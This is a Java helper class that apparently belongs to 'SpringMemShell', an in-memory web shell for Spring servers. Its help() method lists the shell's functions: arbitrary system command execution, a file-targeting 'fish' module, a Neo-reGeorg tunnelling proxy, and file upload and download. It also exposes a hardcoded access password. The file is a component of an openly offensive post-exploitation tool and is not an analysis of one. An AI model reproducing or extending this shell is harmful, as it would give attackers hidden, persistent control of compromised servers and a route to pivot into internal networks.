package com.stdout.Models;

public class Helper {
    public static String help() {
        String result = "";
        result += "models: \n";

        result += "\t 1. exec ==> execute system command\n";
        result += "\t\t param: cmd\n\n";

        result += "\t 2. exit ==> remove the SpringMemShell\n";
        result += "\t\t param: \n\n";

        result += "\t 3. fish ==> static fish\n";
        result += "\t\t action ==> start\n";
        result += "\t\t\t param: target file\n\n";
        result += "\t\t action ==> stop\n";
        result += "\t\t\t param: \n\n";
        result += "\t\t action ==> show\n";
        result += "\t\t\t param: \n\n";

        result += "\t 4. proxy ==> Neo-reGeorg proxy\n";
        result += "\t\t param: \n\n";

        result += "\t 5. file ==> file manager\n";
        result += "\t\t action ==> upload\n" +
                "<font color='red'>" +
                    "Notice: upload file is at (use post)password=stdout&model=file" +
                "</font>";
        result += "\t\t action ==> download\n";
        result += "\t\t\t param: path\n\n";





        return result;
    }
}
